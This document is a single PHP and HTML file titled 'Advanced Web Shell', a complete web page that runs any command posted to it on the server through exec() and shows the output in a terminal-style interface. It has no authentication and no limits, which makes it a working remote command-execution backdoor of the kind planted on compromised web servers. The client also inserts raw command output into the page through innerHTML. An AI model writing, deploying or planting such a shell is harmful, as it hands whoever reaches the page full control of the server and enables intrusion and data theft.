<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $command = $_POST['command'];
    $output = [];
    $return_var = 0;

    $escaped_command = escapeshellcmd($command);
    exec($escaped_command, $output, $return_var);

    echo json_encode([
        'output' => $output,
        'return_var' => $return_var
    ]);
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Advanced Web Shell</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #1e1e1e;
            color: #f1f1f1;
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            flex-direction: column;
        }
        .header {
            background-color: #333;
            padding: 20px;
            text-align: center;
            border-bottom: 1px solid #444;
        }
        .header h1 {
            margin: 0;
            font-size: 24px;
        }
        .main {
            flex: 1;
            padding: 20px;
            overflow-y: auto;
        }
        .output {
            background-color: #000;
            padding: 10px;
            border-radius: 5px;
            white-space: pre-wrap;
        }
        .input-container {
            display: flex;
            padding: 10px;
            background-color: #333;
            border-top: 1px solid #444;
        }
        .input-container input[type="text"] {
            flex: 1;
            padding: 10px;
            border: none;
            border-radius: 5px;
            margin-right: 10px;
            background-color: #555;
            color: #fff;
            font-family: monospace;
        }
        .input-container button {
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            background-color: #444;
            color: #fff;
            cursor: pointer;
        }
        .input-container button:hover {
            background-color: #555;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>Advanced Web Shell</h1>
    </div>
    <div class="main">
        <div id="output" class="output"></div>
    </div>
    <div class="input-container">
        <input type="text" id="command-input" placeholder="Enter command" autofocus>
        <button id="execute-button">Execute</button>
    </div>

    <script>
        document.getElementById('execute-button').addEventListener('click', function() {
            executeCommand();
        });

        document.getElementById('command-input').addEventListener('keypress', function(event) {
            if (event.key === 'Enter') {
                executeCommand();
            }
        });

        function executeCommand() {
            const input = document.getElementById('command-input');
            const command = input.value.trim();
            if (!command) return;

            input.value = '';
            const outputDiv = document.getElementById('output');
            outputDiv.innerHTML += `<div>$ ${command}</div>`;

            fetch('', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                body: `command=${encodeURIComponent(command)}`
            })
            .then(response => response.json())
            .then(data => {
                const output = data.output.join('\n');
                outputDiv.innerHTML += `<pre>${output}</pre>`;
                outputDiv.scrollTop = outputDiv.scrollHeight;
            })
            .catch(error => {
                outputDiv.innerHTML += `<div style="color: red;">Error: ${error.message}</div>`;
                outputDiv.scrollTop = outputDiv.scrollHeight;
            });
        }
    </script>
</body>
</html>
